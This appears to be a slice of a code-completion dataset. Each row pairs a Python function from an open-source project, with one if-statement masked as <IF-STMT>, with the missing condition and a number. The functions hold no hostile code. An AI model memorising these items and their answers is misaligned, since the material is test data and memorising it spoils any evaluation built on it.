1524,"def validate_attributes(cls, cleaned_data):<tab>errors = {}<tab>for field in [""product_attributes"", ""variant_attributes""]:<tab><tab>attributes = cleaned_data.get(field)<tab><tab>if not attributes:<tab><tab><tab>continue<tab><tab>not_valid_attributes = [<tab><tab><tab>graphene.Node.to_global_id(""Attribute"", attr.pk)<tab><tab><tab>for attr in attributes<tab><tab><tab>if attr.type != AttributeType.PRODUCT_TYPE<tab><tab>]<tab><tab><IF-STMT><tab><tab><tab>errors[field] = ValidationError(<tab><tab><tab><tab>""Only Product type attributes are allowed."",<tab><tab><tab><tab>code=ProductErrorCode.INVALID.value,<tab><tab><tab><tab>params={""attributes"": not_valid_attributes},<tab><tab><tab>)<tab>if errors:<tab><tab>raise ValidationError(errors)",if not_valid_attributes :,193
1525,"def forward(self, x, activate=True, norm=True):<tab>for layer in self.order:<tab><tab>if layer == ""conv"":<tab><tab><tab>if self.with_explicit_padding:<tab><tab><tab><tab>x = self.padding_layer(x)<tab><tab><tab>x = self.conv(x)<tab><tab><IF-STMT><tab><tab><tab>x = self.norm(x)<tab><tab>elif layer == ""act"" and activate and self.with_activation:<tab><tab><tab>x = self.activate(x)<tab>return x","elif layer == ""norm"" and norm and self . with_norm :",138
1526,"def _FunctionDef(self, node):<tab>_ScopeVisitor._FunctionDef(self, node)<tab>if len(node.args.args) > 0:<tab><tab>first = node.args.args[0]<tab><tab><IF-STMT><tab><tab><tab>new_visitor = _ClassInitVisitor(self, first.id)<tab><tab><tab>for child in ast.get_child_nodes(node):<tab><tab><tab><tab>ast.walk(child, new_visitor)","if isinstance ( first , ast . Name ) :",111
1527,"def result(self):<tab>""""""Gets the formatted string result.""""""<tab>if self.__group.isChecked():<tab><tab>if self.__moreThan.isChecked():<tab><tab><tab>return ""gt%d"" % self.__min.value()<tab><tab><IF-STMT><tab><tab><tab>return ""lt%d"" % self.__max.value()<tab><tab>if self.__range.isChecked():<tab><tab><tab>return ""%d-%d"" % (self.__min.value(), self.__max.value())<tab>return """"",if self . __lessThan . isChecked ( ) :,122
1528,"def hash_of_file(path):<tab>""""""Return the hash of a downloaded file.""""""<tab>with open(path, ""rb"") as archive:<tab><tab>sha = sha256()<tab><tab>while True:<tab><tab><tab>data = archive.read(2 ** 20)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>sha.update(data)<tab>return encoded_hash(sha)",if not data :,95
1529,"def read_boolean(file: BinaryIO, count: int, checkall: bool = False) -> List[bool]:<tab>if checkall:<tab><tab>all_defined = file.read(1)<tab><tab><IF-STMT><tab><tab><tab>return [True] * count<tab>result = []<tab>b = 0<tab>mask = 0<tab>for i in range(count):<tab><tab>if mask == 0:<tab><tab><tab>b = ord(file.read(1))<tab><tab><tab>mask = 0x80<tab><tab>result.append(b & mask != 0)<tab><tab>mask >>= 1<tab>return result","if all_defined != unhexlify ( ""00"" ) :",146
1530,"def start_prompt(self):<tab>""""""Start the interpreter.""""""<tab>logger.show(""Coconut Interpreter:"")<tab>logger.show(""(type 'exit()' or press Ctrl-D to end)"")<tab>self.start_running()<tab>while self.running:<tab><tab>try:<tab><tab><tab>code = self.get_input()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>compiled = self.handle_input(code)<tab><tab><tab><tab>if compiled:<tab><tab><tab><tab><tab>self.execute(compiled, use_eval=None)<tab><tab>except KeyboardInterrupt:<tab><tab><tab>printerr(""\nKeyboardInterrupt"")",if code :,142
1531,"def _wrap_lineanchors(self, inner):<tab>s = self.lineanchors<tab>i = self.linenostart - 1  # subtract 1 since we have to increment i<tab># *before* yielding<tab>for t, line in inner:<tab><tab><IF-STMT><tab><tab><tab>i += 1<tab><tab><tab>yield 1, '<a name=""%s-%d""></a>' % (s, i) + line<tab><tab>else:<tab><tab><tab>yield 0, line",if t :,109
1532,"def __UpdateQueryHistory(self, query):<tab>clone = datastore_pb.Query()<tab>clone.CopyFrom(query)<tab>clone.clear_hint()<tab>clone.clear_limit()<tab>clone.clear_offset()<tab>clone.clear_count()<tab>if clone in self.__query_history:<tab><tab>self.__query_history[clone] += 1<tab>else:<tab><tab>self.__query_history[clone] = 1<tab><tab><IF-STMT><tab><tab><tab>self.__query_ci_history.add(datastore_index.CompositeIndexForQuery(clone))",if clone . app ( ) == self . _app_id :,145
1533,"def call(self, trajectory: traj.Trajectory):<tab>if not self._batch_size:<tab><tab><IF-STMT><tab><tab><tab>self._batch_size = 1<tab><tab>else:<tab><tab><tab>assert trajectory.step_type.ndim == 1<tab><tab><tab>self._batch_size = trajectory.step_type.shape[0]<tab><tab>self.reset()<tab>if trajectory.step_type.ndim == 0:<tab><tab>trajectory = nest_utils.batch_nested_array(trajectory)<tab>self._batched_call(trajectory)",if trajectory . step_type . ndim == 0 :,141
1534,"def steps(self):<tab>""""""""""""<tab>for step_id in range(self.micro_batches):<tab><tab>cmds = [<tab><tab><tab>LoadMicroBatch(buffer_id=0),<tab><tab><tab>ForwardPass(buffer_id=0),<tab><tab><tab>BackwardPass(buffer_id=0),<tab><tab>]<tab><tab><IF-STMT><tab><tab><tab>cmds.extend(<tab><tab><tab><tab>[<tab><tab><tab><tab><tab>ReduceGrads(),<tab><tab><tab><tab><tab>OptimizerStep(),<tab><tab><tab><tab>]<tab><tab><tab>)<tab><tab>yield cmds",if step_id == self . micro_batches - 1 :,143
1535,"def resolve_project(self, workspace, project_name):<tab>if isinstance(project_name, (int, float)):  # project id<tab><tab>project_id = int(project_name)<tab><tab>self.log.debug(""Treating project name as ID: %s"", project_id)<tab><tab>project = workspace.projects(ident=project_id).first()<tab><tab><IF-STMT><tab><tab><tab>raise TaurusConfigError(<tab><tab><tab><tab>""BlazeMeter project not found by ID: %s"" % project_id<tab><tab><tab>)<tab>elif project_name:<tab><tab>project = workspace.projects(name=project_name).first()<tab>else:<tab><tab>project = None<tab>if not project:<tab><tab>project = self._create_project_or_use_default(workspace, project_name)<tab>return project",if not project :,199
1536,"def __reader(self, collector, source):<tab>while True:<tab><tab>data = os.read(source.fileno(), 65536)<tab><tab>self.__lock.acquire()<tab><tab>collector.append(data)<tab><tab>self.__lock.release()<tab><tab><IF-STMT><tab><tab><tab>source.close()<tab><tab><tab>break<tab>return","if data == """" :",81
1537,"def add(self, undoinfo, msg=None):<tab>if not undoinfo:<tab><tab>return<tab>if msg is not None:<tab><tab>if isinstance(undoinfo[0], str):<tab><tab><tab># replace message<tab><tab><tab>undoinfo = (msg,) + undoinfo[1:]<tab><tab><IF-STMT><tab><tab><tab>undoinfo = (msg,) + undoinfo<tab><tab>else:<tab><tab><tab>undoinfo = (msg, undoinfo)<tab><tab>f = 1<tab>else:<tab><tab>f = int(isinstance(undoinfo[0], str))<tab>assert (<tab><tab>isinstance(undoinfo, list)<tab><tab>or callable(undoinfo[f])<tab><tab>or isinstance(undoinfo[f], list)<tab>)<tab>self.undoList.append(undoinfo)<tab>del self.redoList[:]","elif isinstance ( undoinfo , tuple ) :",198
1538,"def get_history_data(self, guid, count=1):<tab>history = {}<tab>if count < 1:<tab><tab>return history<tab>key = self._make_key(guid)<tab>for i in range(0, self.db.llen(key)):<tab><tab>r = self.db.lindex(key, i)<tab><tab>c = msgpack.unpackb(r)<tab><tab>if c[""tries""] == 0 or c[""tries""] is None:<tab><tab><tab>if c[""data""] not in history:<tab><tab><tab><tab>history[c[""data""]] = c[""timestamp""]<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>break<tab>return history",if len ( history ) >= count :,161
1539,"def __str__(self):<tab>from sqlalchemy.sql import util<tab>details = [SQLAlchemyError.__str__(self)]<tab>if self.statement:<tab><tab>details.append(""[SQL: %r]"" % self.statement)<tab><tab><IF-STMT><tab><tab><tab>params_repr = util._repr_params(self.params, 10)<tab><tab><tab>details.append(""[parameters: %r]"" % params_repr)<tab>return "" "".join([""(%s)"" % det for det in self.detail] + details)",if self . params :,121
1540,"def _consume_msg(self):<tab>async for data in self._stream:<tab><tab>stream = data.get(""ev"")<tab><tab><IF-STMT><tab><tab><tab>await self._dispatch(data)<tab><tab>elif data.get(""status"") == ""disconnected"":<tab><tab><tab># Polygon returns this on an empty 'ev' id..<tab><tab><tab>data[""ev""] = ""status""<tab><tab><tab>await self._dispatch(data)<tab><tab><tab>raise ConnectionResetError(<tab><tab><tab><tab>""Polygon terminated connection: "" f'({data.get(""message"")})'<tab><tab><tab>)",if stream :,135
1541,"def nan2none(l):<tab>for idx, val in enumerate(l):<tab><tab>if isinstance(val, Sequence):<tab><tab><tab>l[idx] = nan2none(l[idx])<tab><tab><IF-STMT><tab><tab><tab>l[idx] = None<tab>return l",elif isnum ( val ) and math . isnan ( val ) :,76
1542,"def _make_binary_stream(s, encoding):<tab>try:<tab><tab>if _py3k:<tab><tab><tab>if isinstance(s, str):<tab><tab><tab><tab>s = s.encode(encoding)<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>s = s.encode(encoding)<tab><tab>from io import BytesIO<tab><tab>rv = BytesIO(s)<tab>except ImportError:<tab><tab>rv = StringIO(s)<tab>return rv",if type ( s ) is not str :,115
1543,"def __set__(self, instance, value):<tab>try:<tab><tab>value = int(value)<tab><tab><IF-STMT>  # max port number is 65535<tab><tab><tab>self.display_value = str(value)<tab><tab><tab>self.value = value<tab><tab>else:<tab><tab><tab>raise PocsuiteValidationException(<tab><tab><tab><tab>""Invalid option. Port value should be between 0 and 65536.""<tab><tab><tab>)<tab>except ValueError:<tab><tab>raise PocsuiteValidationException(<tab><tab><tab>""Invalid option. Cannot cast '{}' to integer."".format(value)<tab><tab>)",if 0 <= value <= 65535 :,140
1544,"def addVaXref(self, va, parent=None):<tab>if parent is None:<tab><tab>parent = self<tab>xtova, ok = QInputDialog.getText(parent, ""Enter..."", ""Make Code Xref 0x%x -> "" % va)<tab>if ok:<tab><tab>try:<tab><tab><tab>val = self.vw.parseExpression(str(xtova))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.vw.addXref(va, val, REF_CODE)<tab><tab><tab>else:<tab><tab><tab><tab>self.vw.vprint(""Invalid Expression: %s   (%s)"" % (xtova, val))<tab><tab>except Exception as e:<tab><tab><tab>self.vw.vprint(repr(e))",if self . vw . isValidPointer ( val ) :,191
1545,"def ArrayBuffer():<tab>a = arguments[0]<tab>if isinstance(a, PyJsNumber):<tab><tab>length = a.to_uint32()<tab><tab><IF-STMT><tab><tab><tab>raise MakeError(""RangeError"", ""Invalid array length"")<tab><tab>temp = Js(bytearray([0] * length))<tab><tab>return temp<tab>return Js(bytearray([0]))",if length != a . value :,91
1546,"def _update_positions(nodes, line_offset, last_leaf):<tab>for node in nodes:<tab><tab>try:<tab><tab><tab>children = node.children<tab><tab>except AttributeError:<tab><tab><tab># Is a leaf<tab><tab><tab>node.line += line_offset<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise _PositionUpdatingFinished<tab><tab>else:<tab><tab><tab>_update_positions(children, line_offset, last_leaf)",if node is last_leaf :,108
1547,"def class_has_method(self, curr_node, the_text):<tab>try:<tab><tab>class_node = self.containers[VAR_KIND_CLASS][-1]<tab><tab>for c in class_node.children:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return True<tab>except:<tab><tab>pass<tab>return False","if isinstance ( c , MethodNode ) and c . name == the_text :",94
1548,"def _fm(map_id):<tab>for i in range(num_key):<tab><tab>for j in range(num_value_per_key):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield (i, j)<tab><tab><tab>else:<tab><tab><tab><tab>yield ((map_id, i), j)",if dup_key :,77
1549,"def _compileRules(rulesList, maxLength=4):<tab>ruleChecking = collections.defaultdict(list)<tab>for ruleIndex in range(len(rulesList)):<tab><tab>args = []<tab><tab>if len(rulesList[ruleIndex]) == maxLength:<tab><tab><tab>args = rulesList[ruleIndex][-1]<tab><tab>if maxLength == 4:<tab><tab><tab>(shouldRunMethod, method, isCorrect) = rulesList[ruleIndex][0:3]<tab><tab><tab>ruleChecking[shouldRunMethod].append((method, isCorrect, args))<tab><tab><IF-STMT><tab><tab><tab>(shouldRunMethod, method) = rulesList[ruleIndex][0:2]<tab><tab><tab>ruleChecking[shouldRunMethod].append((method, args))<tab>return ruleChecking",elif maxLength == 3 :,183
1550,"def select(result):<tab>for elem in result:<tab><tab>parent = elem.getparent()<tab><tab>if parent is None:<tab><tab><tab>continue<tab><tab>try:<tab><tab><tab># FIXME: what if the selector is ""*"" ?<tab><tab><tab>elems = list(parent.iterchildren(elem.tag))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield elem<tab><tab>except IndexError:<tab><tab><tab>pass",if elems [ index ] is elem :,101
1551,"def get_kwarg_or_param(request, kwargs, key):<tab>value = None<tab>try:<tab><tab>value = kwargs[key]<tab>except KeyError:<tab><tab><IF-STMT><tab><tab><tab>value = request.GET.get(key)<tab><tab>elif request.method == ""POST"":<tab><tab><tab>value = request.POST.get(key)<tab>return value","if request . method == ""GET"" :",93
1552,"def __imul__(self, other):<tab>if isinstance(other, str):<tab><tab>other = Matrix(other)<tab>if isinstance(other, Matrix):<tab><tab>if self.start is not None:<tab><tab><tab>self.start *= other<tab><tab><IF-STMT><tab><tab><tab>self.control1 *= other<tab><tab>if self.control2 is not None:<tab><tab><tab>self.control2 *= other<tab><tab>if self.end is not None:<tab><tab><tab>self.end *= other<tab>return self",if self . control1 is not None :,125
1553,"def _parse_date_fmt():<tab>fmt = get_format(""DATE_FORMAT"")<tab>escaped = False<tab>for char in fmt:<tab><tab>if escaped:<tab><tab><tab>escaped = False<tab><tab>elif char == ""\\"":<tab><tab><tab>escaped = True<tab><tab><IF-STMT><tab><tab><tab>yield ""year""<tab><tab>elif char in ""bEFMmNn"":<tab><tab><tab>yield ""month""<tab><tab>elif char in ""dj"":<tab><tab><tab>yield ""day""","elif char in ""Yy"" :",117
1554,def filter_forms(forms):<tab>result = []<tab>seen = set()<tab>for form in forms:<tab><tab><IF-STMT><tab><tab><tab>if pos in self._lemma_pos_offset_map[form]:<tab><tab><tab><tab>if form not in seen:<tab><tab><tab><tab><tab>result.append(form)<tab><tab><tab><tab><tab>seen.add(form)<tab>return result,if form in self . _lemma_pos_offset_map :,100
1555,"def calculate(self):<tab>""""""Enumerate processes by scanning for _EPROCESS.""""""<tab>result = set()<tab>psscan = self.session.plugins.psscan()<tab>pslist = self.session.plugins.pslist()<tab>for row in psscan.collect():<tab><tab>physical_eprocess = row[""offset_p""]<tab><tab><IF-STMT><tab><tab><tab>eprocess = pslist.virtual_process_from_physical_offset(physical_eprocess)<tab><tab>else:<tab><tab><tab>eprocess = physical_eprocess<tab><tab>if eprocess != None:<tab><tab><tab>result.add(eprocess.obj_offset)<tab>self.session.logging.debug(""Listed %s processes using PSScan"", len(result))<tab>return result",if physical_eprocess . obj_vm == self . session . physical_address_space :,195
1556,"def _build_kwargs_string(cls, expectation):<tab>kwargs = []<tab>for k, v in expectation[""kwargs""].items():<tab><tab><IF-STMT><tab><tab><tab># make the column a positional argument<tab><tab><tab>kwargs.insert(0, ""{}='{}'"".format(k, v))<tab><tab>elif isinstance(v, str):<tab><tab><tab># Put strings in quotes<tab><tab><tab>kwargs.append(""{}='{}'"".format(k, v))<tab><tab>else:<tab><tab><tab># Pass other types as is<tab><tab><tab>kwargs.append(""{}={}"".format(k, v))<tab>return "", "".join(kwargs)","if k == ""column"" :",143
1557,"def prec3_expr(self, arg_type):<tab>pass<tab>self.prec4_expr(arg_type)<tab>while True:<tab><tab><IF-STMT><tab><tab><tab>pass<tab><tab><tab>pass<tab><tab><tab>self.match(POWER)<tab><tab><tab>op = struct.pack(""B"", ptgPower)<tab><tab><tab>self.prec4_expr(arg_type)<tab><tab><tab>self.rpn += op<tab><tab>else:<tab><tab><tab>break",if self . LA ( 1 ) == POWER :,121
1558,"def evaluate(analysis, rule):<tab>try:<tab><tab>if isinstance(rule, MetaRule):<tab><tab><tab>result = _evaluate_meta_rule(analysis, rule)<tab><tab>elif isinstance(rule, SingleRule):<tab><tab><tab>result = _evaluate_single_rule(analysis, rule)<tab><tab><IF-STMT><tab><tab><tab>result = _evaluate_sub_path_rule(analysis, rule)<tab><tab>else:<tab><tab><tab>raise TypeError(<tab><tab><tab><tab>""rule must be of one in types [SingleRule, MetaRule, SubPathRule]""<tab><tab><tab>)<tab><tab>return result<tab>except KeyError:  # expected behavior as long as this does not have all other plugins as dependency<tab><tab>return False","elif isinstance ( rule , SubPathRule ) :",171
1559,"def create_log_file(d, logname):<tab>logpath = d.getVar(""LOG_DIR"")<tab>bb.utils.mkdirhier(logpath)<tab>logfn, logsuffix = os.path.splitext(logname)<tab>logfile = os.path.join(<tab><tab>logpath, ""%s.%s%s"" % (logfn, d.getVar(""DATETIME""), logsuffix)<tab>)<tab>if not os.path.exists(logfile):<tab><tab>slogfile = os.path.join(logpath, logname)<tab><tab><IF-STMT><tab><tab><tab>os.remove(slogfile)<tab><tab>open(logfile, ""w+"").close()<tab><tab>os.symlink(logfile, slogfile)<tab><tab>d.setVar(""LOG_FILE"", logfile)<tab>return logfile",if os . path . exists ( slogfile ) :,191
1560,"def init_eventlog(self):<tab>""""""Set up the event logging system.""""""<tab>self.eventlog = EventLog(parent=self)<tab>for dirname, _, files in os.walk(os.path.join(here, ""event-schemas"")):<tab><tab>for file in files:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>self.eventlog.register_schema_file(os.path.join(dirname, file))","if not file . endswith ( "".yaml"" ) :",109
1561,"def resize(self, limit, force=False, ignore_errors=False, reset=False):<tab>prev_limit = self._limit<tab>if (self._dirty and 0 < limit < self._limit) and not ignore_errors:<tab><tab><IF-STMT><tab><tab><tab>raise RuntimeError(<tab><tab><tab><tab>""Can't shrink pool when in use: was={0} now={1}"".format(<tab><tab><tab><tab><tab>self._limit, limit<tab><tab><tab><tab>)<tab><tab><tab>)<tab><tab>reset = True<tab>self._limit = limit<tab>if reset:<tab><tab>try:<tab><tab><tab>self.force_close_all()<tab><tab>except Exception:<tab><tab><tab>pass<tab>self.setup()<tab>if limit < prev_limit:<tab><tab>self._shrink_down(collect=limit > 0)",if not force :,189
1562,"def accept_request(self, request):<tab>if self.restriction_type == BaseViewRestriction.PASSWORD:<tab><tab>passed_restrictions = request.session.get(<tab><tab><tab>self.passed_view_restrictions_session_key, []<tab><tab>)<tab><tab>if self.id not in passed_restrictions:<tab><tab><tab>return False<tab>elif self.restriction_type == BaseViewRestriction.LOGIN:<tab><tab>if not request.user.is_authenticated:<tab><tab><tab>return False<tab>elif self.restriction_type == BaseViewRestriction.GROUPS:<tab><tab><IF-STMT><tab><tab><tab>current_user_groups = request.user.groups.all()<tab><tab><tab>if not any(group in current_user_groups for group in self.groups.all()):<tab><tab><tab><tab>return False<tab>return True",if not request . user . is_superuser :,187
1563,"def getLatestXci(self, version=None):<tab>highest = None<tab>for nsp in self.getFiles():<tab><tab>try:<tab><tab><tab>if nsp.path.endswith("".xci""):<tab><tab><tab><tab>if version is not None and nsp.version == version:<tab><tab><tab><tab><tab>return nsp<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>highest = nsp<tab><tab>except BaseException:<tab><tab><tab>pass<tab>return highest",if not highest or int ( nsp . version ) > int ( highest . version ) :,118
1564,"def evaluate(self, x, y, z):<tab>vertex = Vector((x, y, z))<tab>nearest, normal, idx, distance = self.bvh.find_nearest(vertex)<tab>if self.use_normal:<tab><tab>if self.signed_normal:<tab><tab><tab>sign = (v - nearest).dot(normal)<tab><tab><tab>sign = copysign(1, sign)<tab><tab>else:<tab><tab><tab>sign = 1<tab><tab>return sign * np.array(normal)<tab>else:<tab><tab>dv = np.array(nearest - vertex)<tab><tab><IF-STMT><tab><tab><tab>norm = np.linalg.norm(dv)<tab><tab><tab>len = self.falloff(norm)<tab><tab><tab>dv = len * dv<tab><tab><tab>return dv<tab><tab>else:<tab><tab><tab>return dv",if self . falloff is not None :,200
1565,"def to_py(self, value: _StrUnset) -> _StrUnsetNone:<tab>self._basic_py_validation(value, str)<tab>if isinstance(value, usertypes.Unset):<tab><tab>return value<tab>elif not value:<tab><tab>return None<tab>value = os.path.expandvars(value)<tab>value = os.path.expanduser(value)<tab>try:<tab><tab>if not os.path.isdir(value):<tab><tab><tab>raise configexc.ValidationError(value, ""must be a valid directory!"")<tab><tab><IF-STMT><tab><tab><tab>raise configexc.ValidationError(value, ""must be an absolute path!"")<tab>except UnicodeEncodeError as e:<tab><tab>raise configexc.ValidationError(value, e)<tab>return value",if not os . path . isabs ( value ) :,181
1566,"def validate_load_balancer_sku(namespace):<tab>""""""Validates the load balancer sku string.""""""<tab>if namespace.load_balancer_sku is not None:<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>if (<tab><tab><tab>namespace.load_balancer_sku.lower() != ""basic""<tab><tab><tab>and namespace.load_balancer_sku.lower() != ""standard""<tab><tab>):<tab><tab><tab>raise CLIError(""--load-balancer-sku can only be standard or basic"")","if namespace . load_balancer_sku == """" :",121
1567,"def _getLocalSpineType(self):<tab>if self._spineType is not None:<tab><tab>return self._spineType<tab>else:<tab><tab>for thisEvent in self.eventList:<tab><tab><tab>m1 = re.match(r""\*\*(.*)"", thisEvent.contents)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._spineType = m1.group(1)<tab><tab><tab><tab>return self._spineType<tab><tab>return None",if m1 :,111
1568,"def set_selected_device(self):<tab>current_devices = self.get_current_devices()<tab>if self.device in current_devices.values():<tab><tab>return<tab>for device_name in current_devices.values():<tab><tab><IF-STMT><tab><tab><tab>self.parent.py3.log(f""device {self.device} detected as {device_name}"")<tab><tab><tab>self.device = device_name<tab><tab><tab>break",if self . device in device_name :,110
1569,"def write(self, buff):<tab>if not self.handle:<tab><tab>raise TTransportException(<tab><tab><tab>type=TTransportException.NOT_OPEN, message=""Transport not open""<tab><tab>)<tab>sent = 0<tab>have = len(buff)<tab>while sent < have:<tab><tab>plus = self.handle.send(buff)<tab><tab><IF-STMT><tab><tab><tab>raise TTransportException(<tab><tab><tab><tab>type=TTransportException.END_OF_FILE, message=""TSocket sent 0 bytes""<tab><tab><tab>)<tab><tab>sent += plus<tab><tab>buff = buff[plus:]",if plus == 0 :,143
1570,"def get_named_key_value(self, rule, match, key_name):<tab># search the match for the key specified in the rule to get the value<tab>if key_name in rule:<tab><tab>try:<tab><tab><tab>key_value = lookup_es_key(match, rule[key_name])<tab><tab><tab><IF-STMT><tab><tab><tab><tab># Only do the unicode conversion if we actually found something)<tab><tab><tab><tab># otherwise we might transform None --> 'None'<tab><tab><tab><tab>key_value = str(key_value)<tab><tab>except KeyError:<tab><tab><tab># Some matches may not have the specified key<tab><tab><tab># use a special token for these<tab><tab><tab>key_value = ""_missing""<tab>else:<tab><tab>key_value = None<tab>return key_value",if key_value is not None :,191
1571,"def __iter__(self):<tab>protocol = self.protocol<tab>source = write_source_from_arg(self.source)<tab>with source.open(""wb"") as f:<tab><tab>it = iter(self.table)<tab><tab>hdr = next(it)<tab><tab><IF-STMT><tab><tab><tab>pickle.dump(hdr, f, protocol)<tab><tab>yield tuple(hdr)<tab><tab>for row in it:<tab><tab><tab>pickle.dump(row, f, protocol)<tab><tab><tab>yield tuple(row)",if self . write_header :,125
1572,"def abs__file__():<tab>""""""Set all module' __file__ attribute to an absolute path""""""<tab>for m in sys.modules.values():<tab><tab><IF-STMT><tab><tab><tab>continue  # don't mess with a PEP 302-supplied __file__<tab><tab>try:<tab><tab><tab>m.__file__ = os.path.abspath(m.__file__)<tab><tab>except (AttributeError, OSError):<tab><tab><tab>pass","if hasattr ( m , ""__loader__"" ) :",101
1573,"def _run(self):<tab>when_pressed = 0.0<tab>pressed = False<tab>while not self._done.is_set():<tab><tab>now = time.monotonic()<tab><tab>if now - when_pressed > self._debounce_time:<tab><tab><tab>if GPIO.input(self._channel) == self._expected:<tab><tab><tab><tab>if not pressed:<tab><tab><tab><tab><tab>pressed = True<tab><tab><tab><tab><tab>when_pressed = now<tab><tab><tab><tab><tab>self._trigger(self._pressed_queue, self._pressed_callback)<tab><tab><tab>else:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>pressed = False<tab><tab><tab><tab><tab>self._trigger(self._released_queue, self._released_callback)<tab><tab>self._done.wait(0.05)",if pressed :,187
1574,"def get_run_cmd(submission_dir):<tab>""""""Get the language of a submission""""""<tab>with CD(submission_dir):<tab><tab>if os.path.exists(""run.sh""):<tab><tab><tab>with open(""run.sh"") as f:<tab><tab><tab><tab>for line in f:<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab><tab>return line.rstrip(""\r\n"")","if line [ 0 ] != ""#"" :",98
1575,"def client_read(self, path, **kwargs):<tab>""""""Retrieve a value from a etcd key.""""""<tab>try:<tab><tab>res = self.client.read(<tab><tab><tab>path,<tab><tab><tab>timeout=kwargs.get(""timeout"", DEFAULT_TIMEOUT),<tab><tab><tab>recursive=kwargs.get(""recursive"") or kwargs.get(""all"", False),<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>modified_indices = (res.modifiedIndex,) + tuple(<tab><tab><tab><tab>leaf.modifiedIndex for leaf in res.leaves<tab><tab><tab>)<tab><tab><tab>return max(modified_indices)<tab><tab>else:<tab><tab><tab>return res.value<tab>except EtcdKeyNotFound:<tab><tab>raise KeyNotFound(""The key %s was not found in etcd"" % path)<tab>except TimeoutError as e:<tab><tab>raise e","if kwargs . get ( ""watch"" , False ) :",197
1576,"def populate_wrapper(klass, wrapping):<tab>for meth, how in klass._wrap_methods.items():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>func = getattr(wrapping, meth)<tab><tab>wrapper = make_wrapper(func, how)<tab><tab>setattr(klass, meth, wrapper)","if not hasattr ( wrapping , meth ) :",76
1577,"def _copy_files(self, files, src, dest, message=""""):<tab>for filepath in files:<tab><tab>srcpath = os.path.join(src, filepath)<tab><tab>destpath = os.path.join(dest, filepath)<tab><tab>if message:<tab><tab><tab>print(""{}: {}"".format(message, destpath))<tab><tab>if os.path.exists(srcpath):<tab><tab><tab>destdir = os.path.dirname(destpath)<tab><tab><tab>if not os.path.isdir(destdir):<tab><tab><tab><tab>os.makedirs(destdir)<tab><tab><tab>shutil.copy(srcpath, destpath)<tab><tab><IF-STMT><tab><tab><tab>os.remove(destpath)",elif os . path . exists ( destpath ) :,167
1578,"def scan_iter(self, match=None, count=None):<tab>nodes = await self.cluster_nodes()<tab>for node in nodes:<tab><tab>if ""master"" in node[""flags""]:<tab><tab><tab>cursor = ""0""<tab><tab><tab>while cursor != 0:<tab><tab><tab><tab>pieces = [cursor]<tab><tab><tab><tab>if match is not None:<tab><tab><tab><tab><tab>pieces.extend([""MATCH"", match])<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>pieces.extend([""COUNT"", count])<tab><tab><tab><tab>response = await self.execute_command_on_nodes([node], ""SCAN"", *pieces)<tab><tab><tab><tab>cursor, data = list(response.values())[0]<tab><tab><tab><tab>for item in data:<tab><tab><tab><tab><tab>yield item",if count is not None :,185
1579,"def restart(cls, request, server_name):<tab>with cls._servername_to_shell_server_lock:<tab><tab><IF-STMT><tab><tab><tab>servr = cls._servername_to_shell_server[server_name]<tab><tab><tab>servr.restart()",if server_name in cls . _servername_to_shell_server :,75
1580,"def human_waiting_on(self):<tab>if self.waiting_on is None:<tab><tab>return ""N/A""<tab>things = []<tab>for cluster, queue in self.waiting_on.items():<tab><tab>queue_length = len(queue)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>elif queue_length == 1:<tab><tab><tab>things.append(f""`{cluster}`: `{queue[0].get_instance()}`"")<tab><tab>else:<tab><tab><tab>things.append(f""`{cluster}`: {len(queue)} instances"")<tab>return "", "".join(things)",if queue_length == 0 :,148
1581,"def psea(pname):<tab>""""""Parse PSEA output file.""""""<tab>fname = run_psea(pname)<tab>start = 0<tab>ss = """"<tab>with open(fname) as fp:<tab><tab>for l in fp:<tab><tab><tab>if l[0:6] == "">p-sea"":<tab><tab><tab><tab>start = 1<tab><tab><tab><tab>continue<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>if l[0] == ""\n"":<tab><tab><tab><tab>break<tab><tab><tab>ss = ss + l[0:-1]<tab>return ss",if not start :,142
1582,"def encrypt_system_info_ssh_keys(ssh_info):<tab>for idx, user in enumerate(ssh_info):<tab><tab>for field in [""public_key"", ""private_key"", ""known_hosts""]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>ssh_info[idx][field] = encryptor.enc(ssh_info[idx][field])",if ssh_info [ idx ] [ field ] :,90
1583,"def get_shape(shape):<tab>""""""Convert the shape to correct dtype and vars.""""""<tab>ret = []<tab>for dim in shape:<tab><tab>if isinstance(dim, tvm.tir.IntImm):<tab><tab><tab>if libinfo()[""INDEX_DEFAULT_I64""] == ""ON"":<tab><tab><tab><tab>ret.append(dim)<tab><tab><tab>else:<tab><tab><tab><tab>val = int(dim)<tab><tab><tab><tab>assert val <= np.iinfo(np.int32).max<tab><tab><tab><tab>ret.append(tvm.tir.IntImm(""int32"", val))<tab><tab><IF-STMT><tab><tab><tab>ret.append(te.var(""any_dim"", ""int32""))<tab><tab>else:<tab><tab><tab>ret.append(dim)<tab>return ret","elif isinstance ( dim , tvm . tir . Any ) :",194
